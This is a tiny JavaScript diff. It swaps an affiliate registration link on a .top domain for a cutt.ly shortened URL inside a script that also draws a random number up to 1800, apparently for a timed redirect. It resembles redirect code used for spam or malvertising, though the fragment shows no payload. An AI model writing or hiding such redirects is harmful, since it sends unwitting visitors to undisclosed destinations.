@@ -1,4 +1,4 @@
-var url = ['https://refpa58351.top/L?tag=d_2904689m_62079c_&site=2904689&ad=62079&r=registration/'];
+var url = ['https://cutt.ly/QwAktafE'];
 
 var rndMax = 1800;
 var s = Math.floor((Math.random() * rndMax) + 1);
